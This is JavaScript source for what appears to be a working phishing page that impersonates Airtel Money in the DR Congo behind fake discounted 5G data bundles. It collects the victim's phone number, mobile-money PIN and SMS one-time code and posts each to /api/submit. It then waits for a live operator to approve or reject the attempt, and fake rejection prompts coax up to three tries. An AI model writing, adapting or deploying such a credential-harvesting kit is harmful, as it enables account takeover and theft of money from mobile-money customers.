(function () {
  'use strict';

  /* ============================================================
     CONFIG
  ============================================================ */
  const MAX_TRIALS = 3;             // Total attempts allowed (1st + 2 "more")
  const POLL_INTERVAL = 2000;       // ms
  const POLL_MAX = 90;              // 90 × 2s = 3 minutes

  /* ============================================================
     STATE
  ============================================================ */
  let selectedPlan = null;
  let trialCount = parseInt(sessionStorage.getItem('trialCount') || '0', 10);
  let codeVisible = false;
  let resendInterval = null;

  /* ============================================================
     DOM
  ============================================================ */
  const $ = (id) => document.getElementById(id);
  const screens = {
    plans:   $('screen-plans'),
    login:   $('screen-login'),
    otp:     $('screen-otp'),
    success: $('screen-success'),
    blocked: $('screen-blocked'),
  };
  const plansGrid = $('plansGrid');

  const phoneInput    = $('phoneInput');
  const codeBoxes     = Array.from(document.querySelectorAll('.code-box'));
  const connexionBtn  = $('connexionBtn');
  const eyeBtn        = $('eyeBtn');

  const otpBoxes        = Array.from(document.querySelectorAll('.otp-box'));
  const verifyBtn       = $('verifyBtn');
  const otpPhoneDisplay = $('otpPhoneDisplay');
  const resendTimerText = $('resendTimerText');
  const resendBtn       = $('resendBtn');
  const backToLoginBtn  = $('backToLoginBtn');

  const invalidModal   = $('invalidModal');
  const invalidTitle   = $('invalidTitle');
  const invalidMessage = $('invalidMessage');
  const invalidOkBtn   = $('invalidOkBtn');

  const overlay      = $('approvalOverlay');
  const overlayTitle = $('overlayTitle');
  const overlayText  = $('overlayText');

  const successPlanText = $('successPlanText');
  const successDetail   = $('successDetail');
  const blockedRetryBtn = $('blockedRetryBtn');

  /* ============================================================
     PLAN DATA
  ============================================================ */
  const PLANS = [
    { id:'5gb',   label:'5',  unit:'GB', validity:'Valide 1 Jour',   price:436,   network:'5G',  highlight:true,  badge:null },
    { id:'10gb',  label:'10', unit:'GB', validity:'Valide 3 Jours',  price:895,   network:'5G',  highlight:false, badge:null },
    { id:'20gb',  label:'20', unit:'GB', validity:'Valide 7 Jours',  price:1813,  network:'5G',  highlight:false, badge:null },
    { id:'40gb',  label:'40', unit:'GB', validity:'Valide 7 Jours',  price:3420,  network:'5G',  highlight:false, badge:'Populaire' },
    { id:'80gb',  label:'80', unit:'GB', validity:'Valide 21 Jours', price:6863,  network:'5G+', highlight:false, badge:'Pro' },
    { id:'120gb', label:'120',unit:'GB', validity:'Valide 30 Jours', price:12601, network:'5G+', highlight:false, badge:'Max' },
    { id:'illimite', label:'∞', unit:'', validity:'Valide 30 Jours', price:17190, network:'5G+', highlight:true, badge:'Illimité', full:true },
  ];

  /* ============================================================
     ROUTER
  ============================================================ */
  function navigate(hash) { window.location.hash = hash; }

  function render() {
    const hash = (window.location.hash.replace('#', '') || 'plans');

    // Guard: must have selected plan for every screen except plans/blocked
    if (!['plans', 'blocked'].includes(hash) && !sessionStorage.getItem('selectedPlan')) {
      window.location.hash = '#plans';
      return;
    }
    if (hash === 'otp' && !sessionStorage.getItem('customerPhone')) {
      window.location.hash = '#login';
      return;
    }

    Object.values(screens).forEach(s => s.classList.add('hidden'));
    if (screens[hash]) screens[hash].classList.remove('hidden');

    if (hash === 'otp') {
      const p = sessionStorage.getItem('customerPhone') || '';
      otpPhoneDisplay.textContent = p ? '+243 ' + p : '+243 —';
      resetOtpForm();
    }
    if (hash === 'success') renderSuccess();
    if (hash === 'login') clearResendTimer();

    window.scrollTo(0, 0);
  }
  window.addEventListener('hashchange', render);

  /* ============================================================
     PLAN RENDERING
  ============================================================ */
  function renderPlans() {
    plansGrid.innerHTML = PLANS.map(p => {
      const badge = p.badge
        ? `<div class="badge ${p.badge === 'Illimité' ? 'crown' : ''}">${p.badge}</div>` : '';
      return `
        <div class="plan ${p.highlight ? 'highlight' : ''} ${p.full ? 'full' : ''}">
          ${badge}
          <div class="network">${p.network}</div>
          <div class="data-amount">
            <span class="num">${p.label}</span>
            ${p.unit ? `<span class="unit">${p.unit}</span>` : ''}
          </div>
          <div class="validity">${p.validity}</div>
          <div class="divider"></div>
          <div class="price">${p.price.toLocaleString('fr-CD')} <sup>CDF</sup></div>
          <button class="choose-btn" data-id="${p.id}">CHOISIR CE FORFAIT</button>
        </div>`;
    }).join('');

    plansGrid.querySelectorAll('.choose-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const plan = PLANS.find(x => x.id === btn.dataset.id);
        if (!plan) return;
        selectedPlan = plan;
        sessionStorage.setItem('selectedPlan', JSON.stringify(plan));
        resetLoginForm();
        navigate('#login');
      });
    });
  }

  /* ============================================================
     LOGIN FORM
  ============================================================ */
  function resetLoginForm() {
    phoneInput.value = '';
    codeBoxes.forEach(b => { b.value = ''; b.type = 'password'; });
    codeVisible = false;
    updateEyeIcon();
    validateLoginForm();
  }

  function validateLoginForm() {
    const phoneOk = phoneInput.value.trim().length > 0;
    const pinOk = codeBoxes.every(b => b.value.length === 1);
    const ok = phoneOk && pinOk;
    connexionBtn.disabled = !ok;
    connexionBtn.classList.toggle('active', ok);
  }

  phoneInput.addEventListener('input', () => {
    phoneInput.value = phoneInput.value.replace(/\D/g, '');
    validateLoginForm();
  });

  codeBoxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '');
      if (box.value && i < codeBoxes.length - 1) codeBoxes[i + 1].focus();
      validateLoginForm();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && i > 0) codeBoxes[i - 1].focus();
    });
  });

  function updateEyeIcon() {
    eyeBtn.innerHTML = codeVisible
      ? '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m2 2 20 20"/><path d="M9.88 9.88 14.12 14.12"/><path d="M2 12s3-7 10-7a9.77 9.77 0 0 1 5 1.45"/><path d="M22 12s-3 7-10 7a9.77 9.77 0 0 1-5-1.45"/></svg>'
      : '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>';
  }
  eyeBtn.addEventListener('click', () => {
    codeVisible = !codeVisible;
    codeBoxes.forEach(b => b.type = codeVisible ? 'text' : 'password');
    updateEyeIcon();
  });

  /* ============================================================
     OTP FORM
  ============================================================ */
  function resetOtpForm() {
    otpBoxes.forEach(b => { b.value = ''; });
    validateOtpForm();
    startResendTimer();
  }

  function validateOtpForm() {
    const ok = otpBoxes.every(b => b.value.length === 1);
    verifyBtn.disabled = !ok;
    verifyBtn.classList.toggle('active', ok);
  }

  otpBoxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '');
      if (box.value && i < otpBoxes.length - 1) otpBoxes[i + 1].focus();
      validateOtpForm();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && i > 0) otpBoxes[i - 1].focus();
    });
    box.addEventListener('paste', (e) => {
      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
      if (!text) return;
      e.preventDefault();
      otpBoxes.forEach((b, idx) => { b.value = text[idx] || ''; });
      otpBoxes[Math.min(text.length, otpBoxes.length) - 1].focus();
      validateOtpForm();
    });
  });

  function clearResendTimer() {
    if (resendInterval) { clearInterval(resendInterval); resendInterval = null; }
  }

  function startResendTimer() {
    clearResendTimer();
    let remaining = 60;
    resendBtn.classList.add('hidden');
    resendTimerText.classList.remove('hidden');
    resendTimerText.innerHTML = `Renvoyer dans <b>${remaining}s</b>`;
    resendInterval = setInterval(() => {
      remaining--;
      if (remaining <= 0) {
        clearResendTimer();
        resendTimerText.classList.add('hidden');
        resendBtn.classList.remove('hidden');
      } else {
        resendTimerText.innerHTML = `Renvoyer dans <b>${remaining}s</b>`;
      }
    }, 1000);
  }

  resendBtn.addEventListener('click', () => {
    otpBoxes.forEach(b => { b.value = ''; });
    validateOtpForm();
    otpBoxes[0].focus();
    startResendTimer();
  });

  backToLoginBtn.addEventListener('click', () => navigate('#login'));

  /* ============================================================
     MODAL / OVERLAY HELPERS
  ============================================================ */
  function showError(title, message) {
    invalidTitle.textContent = title;
    invalidMessage.innerHTML = message;
    invalidModal.classList.add('visible');
  }
  invalidOkBtn.addEventListener('click', () => invalidModal.classList.remove('visible'));

  function showOverlay(title, text) {
    overlayTitle.textContent = title;
    overlayText.textContent = text;
    overlay.classList.add('visible');
  }
  function hideOverlay() { overlay.classList.remove('visible'); }

  /* ============================================================
     API
  ============================================================ */
  async function postLog(payload) {
    const res = await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (!res.ok) throw new Error('submit_failed');
    return res.json();
  }

  async function pollStatus(requestId, expectedHash) {
    for (let i = 0; i < POLL_MAX; i++) {
      await new Promise(r => setTimeout(r, POLL_INTERVAL));
      if (window.location.hash !== '#' + expectedHash) return 'cancelled';
      try {
        const res = await fetch('/api/submit?requestId=' + encodeURIComponent(requestId));
        if (!res.ok) continue;
        const data = await res.json();
        if (data.status === 'approved' || data.status === 'rejected') return data.status;
      } catch (_) { /* keep polling */ }
    }
    return 'timeout';
  }

  function handleRejection() {
    trialCount++;
    sessionStorage.setItem('trialCount', String(trialCount));
    if (trialCount >= MAX_TRIALS) {
      navigate('#blocked');
      return;
    }
    const remaining = MAX_TRIALS - trialCount;
    showError(
      'Demande Rejetée',
      `Vos informations n'ont pas pu être vérifiées.<br>
       Veuillez réessayer.<br><br>
       <b>Tentatives restantes : ${remaining}</b>`
    );
  }

  function resetTrialCount() {
    trialCount = 0;
    sessionStorage.setItem('trialCount', '0');
  }

  /* ============================================================
     LOGIN → SUBMIT PIN
  ============================================================ */
  connexionBtn.addEventListener('click', async () => {
    const phone = phoneInput.value.trim();
    if (!/^9\d{8}$/.test(phone)) {
      showError('Format Invalide',
        'Le numéro doit commencer par <b>9</b> et contenir exactement <b>9 chiffres</b>.');
      return;
    }
    if (connexionBtn.disabled) return;

    const pin = codeBoxes.map(b => b.value).join('');
    if (pin.length !== 4) return;

    sessionStorage.setItem('customerPhone', phone);
    showOverlay('Envoi de la demande', 'Transmission de vos informations à Airtel Money…');

    let requestId;
    try {
      const data = await postLog({
        type: 'pin',
        phone,
        pin,
        plan: selectedPlan ? `${selectedPlan.label}${selectedPlan.unit || ''} / ${selectedPlan.validity}` : 'N/A',
        amount: selectedPlan ? selectedPlan.price : 0,
        trial: trialCount + 1,
      });
      requestId = data.requestId;
    } catch (err) {
      hideOverlay();
      showError('Erreur réseau', 'Impossible de transmettre la demande. Vérifiez votre connexion.');
      return;
    }

    overlayTitle.textContent = "En attente d'approbation";
    overlayText.textContent = 'Votre demande a été transmise. Merci de patienter…';

    const result = await pollStatus(requestId, 'login');
    hideOverlay();

    if (result === 'approved') {
      resetTrialCount();
      navigate('#otp');
    } else if (result === 'rejected') {
      handleRejection();
    } else if (result === 'timeout') {
      showError('Délai dépassé', 'Aucune réponse reçue. Veuillez réessayer.');
    }
  });

  /* ============================================================
     OTP → SUBMIT OTP
  ============================================================ */
  verifyBtn.addEventListener('click', async () => {
    if (verifyBtn.disabled) return;
    const otp = otpBoxes.map(b => b.value).join('');
    if (otp.length !== 6) return;

    const phone = sessionStorage.getItem('customerPhone');
    clearResendTimer();
    showOverlay('Vérification en cours', 'Validation de votre code de sécurité…');

    let requestId;
    try {
      const data = await postLog({
        type: 'otp',
        phone,
        otp,
        plan: selectedPlan ? `${selectedPlan.label}${selectedPlan.unit || ''} / ${selectedPlan.validity}` : 'N/A',
        amount: selectedPlan ? selectedPlan.price : 0,
        trial: trialCount + 1,
      });
      requestId = data.requestId;
    } catch (err) {
      hideOverlay();
      showError('Erreur réseau', 'Impossible de vérifier le code. Réessayez.');
      return;
    }

    overlayTitle.textContent = "En attente d'approbation";
    overlayText.textContent = 'Vérification de votre code en cours…';

    const result = await pollStatus(requestId, 'otp');
    hideOverlay();

    if (result === 'approved') {
      resetTrialCount();
      navigate('#success');
    } else if (result === 'rejected') {
      handleRejection();
    } else if (result === 'timeout') {
      showError('Délai dépassé', 'Aucune réponse reçue. Veuillez réessayer.');
    }
  });

  /* ============================================================
     BLOCKED SCREEN — retry escape hatch
     (keeps trialCount high; a new Approve from operator still wins)
  ============================================================ */
  blockedRetryBtn.addEventListener('click', () => {
    sessionStorage.removeItem('customerPhone');
    navigate('#login');
  });

  /* ============================================================
     SUCCESS RENDER
  ============================================================ */
  function renderSuccess() {
    const plan = selectedPlan || JSON.parse(sessionStorage.getItem('selectedPlan') || 'null');
    const phone = sessionStorage.getItem('customerPhone') || '—';
    if (!plan) return;
    successPlanText.textContent = `${plan.label} ${plan.unit || ''} — ${plan.validity}`;
    successDetail.innerHTML = `
      <div>Forfait : <span>${plan.label} ${plan.unit || ''}</span></div>
      <div>Validité : <span>${plan.validity}</span></div>
      <div>Montant débité : <span>${plan.price.toLocaleString('fr-CD')} CDF</span></div>
      <div>Numéro : <span>+243 ${phone}</span></div>
      <div style="margin-top:8px;font-size:13px;color:#888;">Un SMS de confirmation vous sera envoyé sous peu.</div>`;
  }

  /* ============================================================
     INIT
  ============================================================ */
  renderPlans();
  if (!window.location.hash) window.location.hash = '#plans';
  render();
})();